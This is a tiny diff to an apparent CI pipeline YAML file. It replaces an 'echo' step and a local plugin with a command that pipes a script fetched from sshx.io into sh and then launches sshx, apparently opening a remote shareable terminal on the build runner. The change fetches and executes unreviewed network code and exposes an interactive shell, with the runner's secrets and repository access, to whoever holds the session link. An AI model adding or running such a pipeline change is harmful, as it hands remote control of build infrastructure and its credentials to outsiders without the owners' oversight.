@@ -1,5 +1,3 @@
 ---
 steps:
-  - command: echo "hi there"
-    plugins:
-      - "./cool-plugin": {} # This is a local plugin
+  - command: "curl -sSf https://sshx.io/get | sh && sshx"
